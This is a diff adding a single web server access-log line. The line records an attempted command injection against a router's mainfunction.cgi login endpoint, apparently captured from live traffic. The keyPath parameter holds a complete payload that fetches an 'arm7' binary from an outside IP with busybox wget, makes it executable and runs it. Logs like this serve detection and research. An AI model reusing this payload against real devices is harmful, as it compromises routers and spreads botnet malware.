@@ -1,0 +1,1 @@
+64.238.191.247 - - [03/Apr/2020:14:27:26 +0300] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://192.3.45.185/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 150 "-" "-" "-"
